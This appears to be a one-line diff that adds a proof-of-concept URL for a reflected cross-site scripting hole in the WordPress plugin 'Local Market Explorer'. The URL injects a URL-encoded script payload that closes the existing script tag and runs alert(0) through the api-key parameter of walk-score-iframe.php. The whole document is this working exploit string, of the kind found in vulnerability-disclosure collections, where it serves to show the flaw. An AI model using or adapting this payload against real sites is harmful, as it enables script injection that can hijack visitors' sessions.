@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/local-market-explorer/modules/walk-score-iframe.php?api-key=';%3C/script%3E%3Cscript%3Ealert(0)%3C%2fscript%3E%3Cscript%3Evar%20x%20=%20'&location=
